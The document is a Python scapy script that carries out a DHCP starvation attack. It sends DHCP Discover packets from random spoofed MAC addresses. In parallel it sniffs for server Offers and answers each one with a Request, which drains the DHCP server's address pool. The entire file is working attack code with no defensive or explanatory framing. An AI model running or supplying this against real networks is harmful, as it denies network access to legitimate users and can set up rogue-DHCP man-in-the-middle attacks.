import ipaddress
import multiprocessing as mp

from scapy.all import *

# UDP Port Number Protocol
SERVER_DHCP_PORT = 67
CLIENT_DHCP_PORT = 68

# Default Configurations
IFACE = conf.iface
BROADCAST_MAC = 'ff:ff:ff:ff:ff:ff'
META_ADDR = "0.0.0.0"
BROADCAST_IP = "255.255.255.255"

# DHPC Options
MSG_TYPE = 0
SERVER_ID = 1
DHCP_OFFER = 2
ANS = 1


class DHCPStarvation(object):
    def __init__(self, iface, hardware_addr, broadcast_mac, meta_addr, broadcast_ip, random_mac):
        self.iface = iface
        self.broadcast_mac = broadcast_mac
        self.meta_address = meta_addr
        self.broadcast_ip = broadcast_ip

        # Get HW Address
        self.hw = hardware_addr
        self.rand_mac = random_mac

    def send_dhcp_req_pkt(self):
        """ Creates the DHCP Discover Packet to prepare for DHCP Starvation """
        pkt = Ether(src=self.hw, dst=self.broadcast_mac) \
              / IP(src=self.meta_address, dst=self.broadcast_ip) \
              / UDP(sport=CLIENT_DHCP_PORT, dport=SERVER_DHCP_PORT) \
              / BOOTP(chaddr=self.rand_mac) \
              / DHCP(options=[('message-type', 'discover'), 'end'])

        sendp(pkt, iface=self.iface)


def dhcp_starve():
    """  """
    hw = get_if_hwaddr(IFACE)
    my_own_ip = get_if_addr(IFACE)
    server_addr = conf.route.route(META_ADDR)[2]

    for i in range(256):
        random_mac = RandMAC()
        packet = DHCPStarvation(iface=IFACE,
                                hardware_addr=hw,
                                broadcast_mac=BROADCAST_MAC,
                                meta_addr=META_ADDR,
                                broadcast_ip=BROADCAST_IP,
                                random_mac=random_mac)

        packet.send_dhcp_req_pkt()
        time.sleep(2)


def dhcp_pkt_filter(pkt):
    try:
        if pkt.haslayer(DHCP) and pkt[DHCP].options[MSG_TYPE][ANS] == DHCP_OFFER:
            return pkt[UDP].sport == SERVER_DHCP_PORT and pkt[UDP].dport == CLIENT_DHCP_PORT

        return False

    except:
        pass


def dhcp_req(pkt):
    dhcp_request = Ether(src=pkt[Ether].dst, dst=pkt[Ether].src) \
                    / IP(src=META_ADDR, dst=BROADCAST_IP) \
                    / UDP(sport=CLIENT_DHCP_PORT, dport=SERVER_DHCP_PORT) \
                    / BOOTP(chaddr=pkt[BOOTP].chaddr) \
                    / DHCP(options=[('message-type', 'request'), ('server_id', pkt[DHCP].options[SERVER_ID][ANS]), ('requested_addr', pkt[BOOTP].yiaddr),'end'])

    sendp(dhcp_request, iface=IFACE)


def main():
    sniff(lfilter=dhcp_pkt_filter, prn=dhcp_req, iface=IFACE)


if __name__ == '__main__':
    p1 = mp.Process(target=main)
    p2 = mp.Process(target=dhcp_starve)
    p1.start()
    p2.start()

